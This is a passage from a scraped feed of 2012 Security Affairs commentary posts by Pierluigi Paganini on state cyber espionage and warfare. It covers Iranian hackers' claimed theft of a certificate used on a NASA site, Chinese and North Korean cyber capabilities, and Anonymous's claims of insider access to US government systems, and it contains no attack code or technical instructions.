trusted certificate. By stealing the certificate of a trusted vendor reduces the possibility that the malicious software being detected as quickly. That is exactly what happened for Stuxnet virus.\n\nCyber warfare \u2013 Criminals or governments could use the stolen certificates to conduct \u201cman-in-the-middle\u201d attacks, tricking users into thinking they were at a legitimate site when in fact their communications were being secretly tampered and intercepted. That is for example what occurred in the DigiNotar case \u2026 companies like Facebook, Google and also agencies like CIA, MI6 were targeted in Dutch government certificate hack.\n\nEconomic Frauds \u2013 digital signature give a warranty on who signed a document and you can decide if you trust the person or company who signed the file and if you trust the organization who issued the certificate. If a digital certificate is stolen we will suffer of an identity theft, let\u2019s imagine which could be the implication.\n\nIn the specific case the hackers have motivated the attack, in a message published on Pastebin, declaring that the certificate is necessary to perform a man-in-the-middle attack.\n\nOur main work and we target Is in use.Our target was not Internet sabotage , Our Target was Do \u201cMAN IN THE MIDDLE\u201d attack.\n\n( with using Confirmation obtained ) and also Clear the track after each connection in the network For Hide and Disclosing my presence in Two-way communication between.\n\nBut the problem still exists And its use isn\u2019t Hard For We (CW.T) [ http://img.ir/main/upload/up1/img-ir_7b9ba99a0e1.jpg ] <<<<\n\nwe obtain User information for thousands of NASA researcher With Emails and Accounts of other users.Send For You soon Videos of Man in the middle attack and Stealing relationship ( Addressing security managers at NASA ).\n\n\n\nAnalyzing the screenshot published by the hackers the certificate was utilized on the site of NASA\u2019s Solicitation and Proposal Integrated Review and Evaluation System (NSPIRES). The hackers have exploited the authentication process obtaining the administrator\u2019s credentials.\n\n\n\n \n\nIn the message is reported that the hackers have exploited thousands of NASA researcher\u2019s accounts, and they have promised that will release a video of the operation, anyway it\u2019s clear the intent of cyber espionage of the group.\n\nWhat it is interesting to investigate is the real origin of the attack, is it an isolated operation made by a group of Iranian hackers or is it an act of cyber warfare?\n\nTo  hazard hypotheses let\u2019s remind the content of significant report \u201cThe Iranian Cyber Threat to the U.S. Homeland\u201d Statement before the U.S. House of Representatives Committee on Homeland Security Subcommittee on Cybersecurity, Infrastructure Protection, and Security Technologies and Subcommittee on Counterterrorism and Intelligence. In the document are analyzed the growing Iranian capabilities, the country expanding exploitation of cyberspace can be attributed to two principal geopolitical drivers:\n\nThe report clarify the position of Teheran that is considering itself engaged in a cyber war with West, due this reason the Iranian regime is mobilizing in response launching an ambitious $1 billion governmental program to boost national cyber capabilities, acquiring new technologies, investing in cyber defense, and creating of a new army of cyber experts.\n\nIranian Government is working on different fronts in my opinion, on one side it\u2019s recruiting internal hackers in the name of religious motivations, on the other hand it is acquiring knowledge from mercenaries hackers coming from East Europe and also from Asia. It will no difficult for Iran to prepare its own cyber arsenal, and these cyber weapons could hit vulnerable western critical infrastructures.\n\nI personally think that the cyber attack is linked to the Iranian government.\n\nIt\u2019s not the first time that the NASA is hacked, in the beginning of the year several attacks revealed that the agency is unprepared for cyber attacks.\n\nThe situation is worrying, we must consider the strategic importance of intellectual property exposed due to these accidents. We have repeatedly stressed the attention of foreign governments in strategic technology solutions in industries such as aerospace. In these areas it is extremely high the contribute in term of research and innovation made by new technologies that are introduced in later years in the traditional sectors. Be able to steal these information means bridging a gap of technology and research for decades with disastrous consequences in economic terms.\n\nNASA Inspector General Paul K. Martin declared that in 2011 the agency was the target of 47 cyber attacks known as advanced persistent threats (APTs) surely made by group of expert hackers with deep knowledge of their target and of the information to search and steal, this is the proof that we are facing with cyber intelligence operations made by hostile governments. Martin admitted:\n\n\u201cthe attackers had full functional control over these networks.\u201d\n\nSince the declaration of the official, a number of security experts claimed that some actions were done to improve security of the infrastructures of the agency, but the events seems demonstrate that they are not sufficient.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/attack", "topic_name": "attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digitally-signed", "topic_name": "digitally signed"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/frauds", "topic_name": "frauds"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/man-in-the-middle", "topic_name": "man-in-the-middle"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nasa", "topic_name": "NASA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ssl-certificate", "topic_name": "SSL certificate"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "US vc China.

In fact, the intent of the meetings are certainly questionable if the expressions of confidence shown by the U.S. to China during the summit will dissolve as soon as you return to discuss cyberespionage and the possibility of outsourcing US telecommunications services to Chinese companies.\n\nExponents of the Pentagon are convinced that China is investing in to improve its cyber capabilities to conduct offensive operations, Deputy Assistant Secretary of Defense for East Asia and Asia Pacific Security Affairs David Helvey declared.\n\n\u201cChina is investing in not only capabilities to better defend their networks but also they\u2019re looking at ways to use cyber for offensive operations,\u201d\n\nThe principal aspect of Chinese cyber strategy that worrying the Pentagon is the increasing capabilities in cyberespionage with particular reference of network exploitation. The Government of Bejing has always demonstrated a great interest in the cyber warfare acquiring in the time a sensible advantage that has allowed the nation to perform stealth cyber operations that created a lot of damage and that have caused the theft of intellectual property and sensible information.\n\nHalvey also added:\n\n\u201cWe continue to see China expressing interest in making investments to improve their capacity for operations in cyberspace, and that is something that we pay very, very careful attention to. There is the potential for these types of operations to be very disruptive, disruptive not only in a conflict, could be very disruptive to the United States, but other countries as well.\u201d\n\n\u201cI mean, that\u2019s one of the things about military operations in cyberspace, that there can be cascading effects that are hard to predict,\u201d\n\nThe Pantagon has collected information that demonstrate the improvement of Chinese capabilities in conventional warfare but also in cyber warfare, the China in fact is investing in military system that can be adopted in military operations to attacks targets located far from Chinese Soil. It\u2019s clear that this types of weapons are rich of technology and request advanced capabilities for implementation and deployment.\n\nHalvey announced that China is mainly investing in submarines, advanced surface combatants and also in unmanned air systems. In the past China has acquired foreign unmanned aerial vehicles from foreign countries such as Israeli, maybe with the intent to analyze the device to product an internal system.\n\n\n\nChina scares, in my opinion, for two main reasons:\n\nAmerica and the entire West are having to chase in a state of great economic disadvantage and this is the aspect that most worries. Limited capital spending and constantly under careful review of the governments represent a principal limitations.\n\nThe American and the West in general, have underestimated the military development of nations such as China and India don\u2019t evaluating risks related to future confrontation, this is happened in the conventional military area and in the cyber warfare. A tearing the U.S. economy, as well as an economic crisis unprecedented, there are at least two decades of conflict, Iraq and Afghanistan, where the nation was involved, who have requested and require a costly waste of energy.\n\nAwareness today is certainly appropriate even if it comes late. The social fabric of nations as the U.S. is now permeated by the presence of Chinese money, western companies work daily with those in Asia in the realization of new projects, sharing  information on sensitive technology. A step back today is certainly not feasible, but the demonstration of not to be more willing to accept so aggressive cyber strategies seems desirable.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionage", "topic_name": "Cyberespionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Concerns for Chinese firms and the cyberespionage", "news_link": "https://securityaffairs.co/wordpress/5455/hacking/concerns-for-chinese-firms-and-the-cyberespionage.html", "title": "Concerns for Chinese firms and the cyberespionage\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 19, 2012", "body": "We often discuss about warfare and cyberespionage, focusing on the usage of technology to steal intellectual property of foreign states.

According to the FCC, 43.5% of the company is indirectly owned by foreign interests.\n\n \n\nOf course the threat is not related to every foreign company but it\u2019s specific for those businesses that are government-owned like some Chinese mobile phone giants. The specific case is related to the world\u2019s largest mobile provider China Mobile applied in October for a license from the Federal Communications Commission to provide service between China and the United States and to build facilities on American soil. Of course the concerns of the intelligence services are high, providing similar projects foreign companies have access to communication infrastructures and network traffic making possible spying operations and the exposure of intellectual propriety and national secrets. The risks is concrete, in many occasion has been discussed about the continuous attacks of Chinese stated sponsor hackers against American networks. Officials from the FBI, the Department of Homeland Security and the Justice Department\u2019s national security division compose a special collective named \u201cTeam Telecom,\u201d in charge of review FCC applications by foreign-owned companies. The problem is really critic, on one side we have valuable business opportunity, on the other hand there is the security of the nation, for this reasons the group have to define a proper agreement to preserve both needs. In discussion is the routing of traffic from US Carriers (e.g. Verizon Communications Inc. or AT&T Inc) on networks the management of which is licensed by China Mobile. The firm declined to address allegations about Chinese spying and is actually collaborating with US Government for the definition of a satisfactory agreement. In the past Chinese companies China Telecom and China Unicom have been already engaged to carry telecommunications services, but they were other times when no cyber strategy took into account the threat of cyberespionage. Similar agreements have required in the past to the manufacturer the classification and census of all equipment used as communication vector such as undersea cables used to carry traffic to and from the United States. Meanwhile in US is discussing the allocation of services to foreign companies the Reuters agency has confirmed that the ZTE Corp, the world\u2019s No.4 handset vendor, reported that one of its mobile phone models sold in the US contains a vulnerability that could allow a remote control of the handset. The backdoor affects ZTE\u2019s Score model based on Android operating system, it\u2019s the first case reported on the platform and many expert are convinced that the event is not casual. Not to mention the rivers of charges read out against another Chinese company with state participation, the Huweai.\n\nPersonally I feel very justified concerns of U.S. security experts, the risk of espionage is real must be managed with the utmost care to avoid catastrophic consequences.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china-mobile", "topic_name": "China Mobile"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/chinese-firms", "topic_name": "Chinese firms"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionage", "topic_name": "Cyberespionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/huweai", "topic_name": "Huweai"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zte", "topic_name": "ZTE"}]}, {"news_name": "Has Anonymous infiltrated US Government?

One story in particular struck us deeply, that relating to the vulnerability of U.S. Government networks for admission of senior government officials are routinely hacked. Difficult to accept a reality that is disconcerting, one of the major superpowers in the world forefront of the technology is vulnerable to attack by hacker groups animated by the most diverse motives.\n\nWho is interested to US networks and why?\n\nConsider that cyber infrastructures of a country are a mine of news that attracts foreign governments, independent hackers and also hacktivism, all this forces daily combine their actions against the same target. The success of the cyber attacks against US networks, according the declarations of the security experts, is due the US infrastructure status that are protected by obsolete defense systems unable to fight against continuous incursions. Speaking before the Senate Armed Services Subcommittee on Emerging Threats and Capabilities the experts told the assembled Senators that the U.S. government needed to abandon the notion that it could keep outsiders off its computer networks.\n\nVery meaningful the worlds pronounced by Senator Rob Portman member of the Emerging Threats and Capabilities subcommittee:\n\n\u201cWe can do things to make it more costly for them to hack into our systems\u2026,\u201d\n\n\u201cbut you didn\u2019t say we can stop them.\u201d\n\nA clear message that expresses the awareness of the threat and impossibility to defeat it in the short term This time the revelations on the status of US networks come from the famous group Anonymous, in a recent interview its component Christopher \u201cCommander X\u201d Doyon, who today lives in Canada, declared:\n\nRight now we have access to every classified database in the U.S. government. It\u2019s a matter of when we leak the contents of those databases, not if. You know how we got access? We didn\u2019t hack them. The access was given to us by the people who run the systems\u2026\n\nThe five-star general (and) the Secretary of Defense who sit in the cushy plush offices at the top of the Pentagon don\u2019t run anything anymore. It\u2019s the pimply-faced kid in the basement who controls the whole game, and Bradley Manning proved that.\n\nAccording Doyon, the great force of the groups is made by insiders in government infrastructures that give the group an unimaginable power, the power of knowledge and information.\n\n\n\nDoyon has admitted him participation in some of the most important attacks on websites last year from Sony to PayPal. He was arrested in September for a minor hack on the county website of Santa Cruz, Calif., where he was living, in retaliation for the town forcibly removing a homeless encampment on the courthouse steps.\n\nFor that, Doyon is facing 15 years in jail. But he crossed the border into Canada in February to avoid prosecution.  Doyon was the leader of the People\u2019s Liberation Front , a group allied with Anonymous and is considered the most wanted hacktivist after Julian Assange.\n\nThe hacker has reiterated the concept saying\n\n\u201cThe entire world right now is run by information,\u201d\n\n\u201cOur entire world is being controlled and operated by tiny invisible 1s and 0s that are flashing through the air and flashing through the wires around us. So if that\u2019s what controls our world, ask yourself who controls the 1s and the 0s? It\u2019s the geeks and computer hackers of the world.\u201d\n\nWhat the hacker claims regarding today\u2019s information society is correct, each date is related to its simple binary representation, a core of information expressed using 0s and 1s that can never be considered completely safe.\n\nWhat do you think about the revelation of the exponent of the group? What is the truth behind these declarations?\n\nWe are now accustomed to sensational statement by Anonymous, we all recognize its great media capacity, but rather than believing the truth exposed the experts have the following interpretations:\n\nI think both assumptions valid while acknowledging that Doyon has certainly exaggerated in his claims to more striking its declarations. The risk of insider close to the group is high and to face similar threats requires observations of procedures and protocols in order to prevent access to confidential information.\n\nI\u2019m still convinced that the group is in a phase of profound transformation, new inside tumultuous currents have born and they could degenerate to dangerous insurgents.\n\nIn my opinion, such statements must be taken into consideration but I also believe that the group has issued statements to pursue a clear strategy of media presenteeism.\n\nIn recent weeks, in several articles I predicted the possibility that law enforcement and intelligence agencies were infiltrating the group, today according hacktivist\u2019s declaration we are assisting to a reverse of the scenario. The reality is that both factions fear the event and are working so that the damage could be minimal in case of external conditions.\n\nMeanwhile we have few info on how Anonymous is approaching the problem, on the opposite site we have perception of how major government agencies are facing the threat. I note that the FBI in more than one occasion pointed out the need to detect insider providing valuable guidance and insights on the topic.\n\nRegard the topic I suggest to read the guidance provided by FBI \u201cThe Insider Threat An introduction to detecting and deterring an insider spy.\u201d an introduction for security personnel on how to detect an insider threat and provides tips on how to safeguard your company\u2019s trade secrets. Cyber espionage and theft of intellectual property are increasing threats to organizations and government institutions that can go unnoticed for months or even years.\n\nThe message is:\n\n\u201cWe must remain on guard, we don\u2019t wait for the day when Doyon\u2019s words will come true\u201d\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/insider", "topic_name": "insider"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s-government-networks", "topic_name": "U.S. Government networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-government", "topic_name": "US Government"}]}, {"news_name": "A picture of the Iran threat", "news_link": "https://securityaffairs.co/wordpress/5249/intelligence/a-picture-of-the-iran-threat.html", "title": "A picture of the Iran threat\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 14, 2012", "body": "The situation in Iran is becoming really critic, time go by and every diplomatic solution is not realizable. We have western countries disturbed by an aggressive policy of the government in Tehran, defiant as ever, that risks trigger a dangerous situation in the Middle East undermining the unstable equilibrium of the whole area. Many time we have said that a military option has sense only if conduced in a short time, experts and scientists are convinced in fact that Iran in a couple of years will be able to build its own nuclear arsenal. In the meantime, despite the Western threats, Iran is still working on the debated nuclear program. According the revelations of an exiled Iranian opposition group Iran has some 60 scientists and engineers involved in a concerted and expanding program to develop nuclear weapons under the control of ministry of defense. Government of Teheran is rejecting any allegations about uranium enrichment program, arguing that the goals are not military but related to supplies of alternative energy. The US and Israeli intelligence officials are convinced that the program has the unique purpose to create new weapons for the Government, opinion also share with the National Council of Resistance of Iran (NCRI) that has provided to the Reuters agency a report that says:\n\n\u201cInformation \u2026 shows that the clerical regime has expanded the organization responsible for nuclear weapons development,\u201d \u201cThis finding reveals a complete and elaborate, and highly \u2026 secret research structure and a network for procurement of the required parts and equipment. \u201cSo far, the identities of 60 directors and experts working in various parts of the New Defense Research Organization and 11 institutions and companies affiliated with it have been detailed,\u201d\n\nA nuclearized Iran represents a threat to Israel\u2019s existence, and a serious threat for all the western countries.\n\nIf the US and Israel are postponing a conventional military option, different approach has been followed in the cyberspace, the new battle field. The Obama administration has concentrated great efforts in this area especially in the last couple of year, increasing awareness on cyber threats and the related risks for the Nation. Protection of critical infrastructures is the first target of the cyber strategy but despite the great effort, too many plants and networks are still vulnerable. Countries such as China and Russia, but also the same Iran, are de fact dangerous cyber threats that can infiltrate US networks and attacks American private companies.\n\nThe alarm is high.\n\n\n\nIt is opinion of the security experts that Iran could represent a serious threat in the cyberspace, the domain where Teheran has major possibilities to deal with the American enemy. We must consider that Iranian Government is facing with international sanctions and internal dissents against central administration. The internal conflicts have created several problems to Iran that in the last year has invested a lot in web monitoring systems with the intent to control and to isolate the external infiltrations, avoiding that internal opposition could benefit of foreign collaboration and could be influenced by western cultures. The surveillance of web has became in short time a priority for Iran that could count on the cooperation of China, one of the nations to have greater experience in the field of media monitoring. We must also consider that the interest on cyberspace of Teheran has been driven by the need to protect their critical infrastructures from cyber threats developed by hostile countries. Stuxnet is considered one of the most aggressive and innovative cyber weapon that hit Iran and its nuclear program. Suddenly Iran has discovered itself vulnerable to this new type of attacks that requested an immediate commitment in cyberspace and investments in related technologies.  The Iranian Government has invested more over $1 billion to improve national cyber capabilities, promoting the creation new cyber army composed by experts and young resources trained to the cyber war. The international community is convinced that Iran is one of most advanced country in cyber offense matter, it obvious to imagine that that potential could be directed against hostile countries. The cyber offense against Iran has triggered a massive engage of the country in cyber warfare, Teheran has officially declared war to the West. It\u2019s clear that Iranian government has invested more in cyber offense capabilities than cyber defense. This imbalance is increased during the last year, evidence that Teheran is really interested to move cyber attacks against its enemies. Director of National Intelligence James R. Clapper, reporting to the Senate Select Committee on Intelligence in January, on Iranian cyber capabilities declared:\n\n\u201chave dramatically increased in recent years in depth and complexity.\u201d More and more, they also appear to be directed against the United States.\n\nIt\u2019s clear that government such as Israel and US, but also European countries, are scared by Iran capabilities, so they have also started massive cyber operation against Iran to evaluate its defense system, but also with the objective to offend strategic sector of the countries, like Oil sector. In the last week several attacks have hit the Oil industry, and in the past months many countries have approved cyber sanction against Teheran, like the prohibition of sale to Iran anti-virus systems.  But the most plausible situation is that Iran and Western alliance are working on a new generation on cyber weapons. This new type of weapons represents an excellent compromise in term of costs and efficiency, but what is most interesting in this phase is the possibilities to adopt them in covert operations.\n\nFirst of all they are reinforcing their infrastructures intensifying the monitoring of the web as described before with the help of historical partner. Also massaging platform have been impacted, Iran\u2019s Minister of Communications and Technology has announced a ban on the use of foreign email services such as Gmail and Yahoo to \u201cprotect information security.\u201d  The processes implemented have moved every government web resource (e.g. critical servers and web sites) in hardened infrastructure under direct control of the regime. Second step is related to the adoption of security system, hardware and software, developed in home to avoid presence of backdoors. Next objective is the developing of a national internet aimed protecting the transfer of information and \u201ccleansing\u201d inappropriate content.\n\nGiving a look to these measures it\u2019s clear that Iran is trying to reinforce those aspects in the defense that experts have evidenced as vulnerabilities of Iran cyber forces.\n\nAt this point the question is:\n\nWill Western military coalition attack the Iran or the battlefield will be just cyber space?\n\nPersonally I think it\u2019s not probably an impending attack but I\u2019m also convinced that a military option is the only viable in the absence of dialogue.\nThe opposition of Russia and China to a military operation is in fact blocking all operations of the Western coalition providing to the regime of Teheran precious time to organize its resources.\nAnother discriminant factor is the real intention of the United States and Israel to engage in a conflict far from simple. Iran may in fact hide dangers not less than those faced in wars such as Afghanistan. The Afghanistan war started in 2001, in an economic context profoundly different, in a today analysis it must be considered the global economic crisis that would prevent any government to face a potentially costly conflict and outcomes so uncertain.\nIt\u2019s also true that the crisis could also accelerate a decision, Iran is one of the main oil produced and its natural resources could represent a good reason to justify a conflict although expensive.\n\nHow close are we to the point of no return?\n\nOnly the time could provide us the answer to our question.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/awareness", "topic_name": "awareness"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/backdoors", "topic_name": "backdoors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring-systems", "topic_name": "monitoring systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/networks", "topic_name": "networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil-industry", "topic_name": "Oil Industry"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/threat", "topic_name": "threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "US and China are working for stability in Asia-Pac", "news_link": "https://securityaffairs.co/wordpress/5107/intelligence/us-and-china-are-working-for-stability-in-asia-pac.html", "title": "US and China are working for stability in Asia-Pac\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 10, 2012", "body": "In recent days I have discussed the increasing tension between China and the Philippines for a territorial dispute and related effects which have had significant repercussions in cyber space.

A large number of cyber attacks have hit South Korea from North Korea near its border affecting the GPS navigation for passenger aircraft, ships, and in-car navigation.\n\nFortunately no accidents have been attributed to jammed navigation signals aboard 337 commercial flights in and out of South Korean international airports, on 122 ships, including a passenger liner carrying 287 people and a petroleum tanker.\n\nThis is not the first time, South Korea faced with same type of attacks in March 2011, and in August and December of 2010.  According the South Korean Defense Ministry the country is adopting anti-jam programs to counter the attacks. The Communications Commission deputy director declared that they have traced the jamming signals to the direction of Kaesong, 10 kilometers from the border between the two countries, and roughly 50 kilometers from downtown Seoul, Incheon International Airport, and the Yellow Sea. Is not clear who is providing jamming technology to North Korea, the likely suspects are Russia and China.\n\n\n\nA defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nIntelligence sources in South Korea believe that the Nation has a large a cyber force that responds to the command of the country\u2019s top intelligence agency, the General Reconnaissance Bureau.\n\nAccording the revelation of Army General James Thurman, the commander of US Forces Korea, the government of Pyongyang is massive investing in cyber warfare capabilities, recruiting and forming high skilled team of hackers.  A defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nGroups of hackers could be engaged in offensive cyber operation against hostile government and in cyber espionage activities.\n\nAnalyzing the events is clear that the situation in that area is becoming difficult to manage and it is necessary the intervention of the major countries like US and China, for this reason Leon Panetta, United States Secretary of Defense, and Chinese Defense Minister Liang Guanglie has an official meeting.\n\n\u201cThe United States and China are powers in the Pacific and our goal is to establish a constructive relationship for the future,\u201d Panetta said. \u201cIt is essential for our two nations to communicate effectively on a range of very challenging issues.\u201d\n\nRegarding the cyber capabilities of the countries Panetta said:\n\n\u201cBut because the United States and China have developed technological capabilities in this arena it\u2019s extremely important that we work together to develop ways to avoid any miscalculation or misperception that could lead to crisis,\u201d \n\nIn that occasion the Chinese representative refused any accusation of cyber operations against US, Panetta reiterated that many countries and hackers were involved in cyber attacks on the United States and China.\n\nOther worrying situations discussed during the meeting at the Pentagon were the evolution of North Korea\u2019s nuclear programs, U.S. missile Defense efforts, U.S. arms sales to Taiwan and territorial dispute between China and Philippines.\n\nOfficial sources declared that US is really worried about Chinese development of conventional weapons and cyber weapons, a senior U.S. Defense official said:\n\n\u201cWe\u2019d like to be able to understand a little bit more about why the Chinese are investing in this very robust and rapid military modernization program given the security environment that we see in the Asia-Pacific today, which is a region that\u2019s at peace,\u201d \n\nOn the other side China is concerned about US strategic and its interferences in the Asia-Pacific region, that is why meeting like this are really important for the future equilibrium in a critical area such as in the cyberspace.\n\nThe situation is complex, because while the dialogue continues between the main protagonists, at least in cyberspace, the hostilities did not cease. The U.S. still blames China for major attacks on their computer networks, China continues to pursue a policy to protect America\u2019s historical enemies, like Iran and North Korea itself, supporting them technologically and US still making massive investing in the production of new cyber weapons.\nAt least in cyber space, peace is far.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/asia-pac", "topic_name": "Asia-Pac"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-philippines", "topic_name": "The Philippines"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/united-states", "topic_name": "United States"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Insider perspectives on global cyber safety and security status", "news_link": "https://securityaffairs.co/wordpress/5084/security/insider-perspectives-on-global-cyber-safety-and-security-status.html", "title": "Insider perspectives on global cyber safety and security status\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 9, 2012", "body": "Article published on The Malta Indipendent\n\nToday there is a lot of interest in \u201cCyber warfare\u201d and \u201cCyber threats\u201d. Week after week we are bombarded with news about massive security failures, one after the other. For example, according to the Utah Department of Health, the sensitive personal information of more than 780,000 people was stolen from a government health department 